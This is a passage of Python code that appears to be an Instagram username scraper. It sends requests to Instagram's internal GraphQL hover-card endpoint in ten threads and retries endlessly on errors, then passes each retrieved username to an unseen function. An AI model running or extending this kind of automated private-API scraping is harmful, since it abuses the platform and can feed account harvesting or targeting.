    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
    'server_timestamps': 'true',
    'doc_id': '7717269488336001',
}
      response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
      user =response.json()['data']['user']['username'] 
      mortada(user)  
  except :
  	username1()

for i in range(10):
  Thread(target=username1).start()